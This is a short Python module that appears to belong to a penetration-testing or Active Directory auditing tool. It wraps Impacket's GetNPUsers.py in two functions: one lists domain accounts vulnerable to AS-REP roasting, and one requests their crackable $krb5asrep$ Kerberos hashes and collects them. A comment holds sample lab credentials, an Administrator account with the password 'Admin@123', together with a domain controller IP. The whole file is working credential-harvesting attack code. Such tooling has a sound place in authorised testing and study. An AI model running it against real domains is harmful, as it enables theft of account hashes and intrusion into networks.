import subprocess
# run_kerberoast('gikyon.local', 'Administrator', 'Admin@123', '192.168.80.132')
# app/utils/
def check_asreproast(domain, username, password, target_ip):
    creds = f"{domain}/{username}:{password}"

    output = subprocess.run(
        ['python', 'app/utils/tools/GetNPUsers.py', '-dc-ip', target_ip, creds],
        capture_output=True,
        text=True
    )

    result_withbanner = output.stdout.splitlines()
    result = result_withbanner[4:]
    formatted = []
    for line in result:
        information = line.split()
        if len(information) > 3:
            formatted.append(f"{information[1]} - {information[0]}")
    return formatted


def run_asreproast(domain, username, password, target_ip):
    creds = f"{domain}/{username}:{password}"

    output = subprocess.run(
        ['python', 'app/utils/tools/GetNPUsers.py', '-dc-ip', target_ip, creds, '-request'],
        capture_output=True,
        text=True
    )

    result = []

    for line in output.stdout.splitlines():
        if '$krb5asrep$' in line:
            result.append(line)
    
    return result